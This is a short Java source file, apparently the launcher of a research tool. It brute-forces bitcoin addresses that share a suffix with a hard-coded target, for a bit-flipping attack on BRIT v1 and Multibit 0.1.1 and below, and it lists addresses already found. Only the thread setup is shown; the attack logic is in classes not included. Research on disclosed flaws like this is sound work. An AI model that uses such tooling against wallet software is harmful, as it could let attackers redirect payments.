/**
 * Copyright 2015 Marclass
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *    http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */


package bruteForcer;

public class Run {

	/**
	 * Simple bruteForcer to find valid bitcoin addresses that would work for use in a bit flipping attack against
	 * BRIT version 1 and Multibit 0.1.1 and below. 
	 * 
	 * For more info on the attack see the blog post at https://multibit.org/blog.html
	 * 
	 * 
	 * requires Bouncy Castle and Guava
	 */
	
	
	public static void main(String[] args) throws AddressFormatException, InterruptedException{
		/**
		 * Currently hard coded to use addr = '16UwLL9Risc3QfPqBUvKofHmBQ7wMtjvM',
		 * randomizes indexes 1..15, and spawns 4 brute force threads. If you're 
		 * reading this you can change those to whatever you like. 
		 */
		String testAddr="16UwLL9Risc3QfPqBUvKofHmBQ7wMtjvM";
		// found 
		//1yoVWJsArgM6FgLqBUvKofHmBQ7wMtjvM
		//1VEZvA4mApUjvP5qBUvKofHmBQ7wMtjvM
		//1wXXbEVRu9XGzcpqBUvKofHmBQ7wMtjvM
		//13sPH9iJyriu24yqBUvKofHmBQ7wMtjvM
		//1fDmv7J6XTNQmXVqBUvKofHmBQ7wMtjvM
		//11N3myPVa79dJCiqBUvKofHmBQ7wMtjvM
		//1Cv2dEJFA11R3YjqBUvKofHmBQ7wMtjvM
		//17aq24aB6jMDt4gqBUvKofHmBQ7wMtjvM
		
		//1ZuW4d5rqL9giyFqBUvKofHmBQ7wMtjvM
		//11YKLgUDqxXD8DoqBUvKofHmBQ7wMtjvM
		//1WYZjME5s9tXdD4qBUvKofHmBQ7wMtjvM
		//1HSb2C1FR6A9y88qBUvKofHmBQ7wMtjvM
		//1XR1GM2ScaMFvxWqBUvKofHmBQ7wMtjvM
		//1oyHaBvLALhrZxKqBUvKofHmBQ7wMtjvM
		
		/*
		System.out.println("testAddr= "+testAddr);
		System.out.println(new String(Base58.encode(Base58.decodeChecked(testAddr))));
		System.out.println(new String(Base58.encode(Base58.decode(testAddr)))+"\n");
		System.out.println(new String(Base58.encode(Base58.decodeChecked(testAddr.getBytes()))));
		System.out.println(new String(Base58.encode(Base58.decode(testAddr.getBytes())))+"\n");
		*/
		
		//BruteForce bf=new BruteForce(testAddr);
		
		BruteForceThreadManager manager = new BruteForceThreadManager(4);//default 4 threads
		//0 spawns as many as you have cpus 
		
		manager.addBruteAddr(testAddr);
		//manager.addBruteAddr(testAddr);
		
		manager.begin(1, 15);//set indexes [1,15] mutable for brute forcing
		
		
		//System.out.println(result);
	}
	
	
}
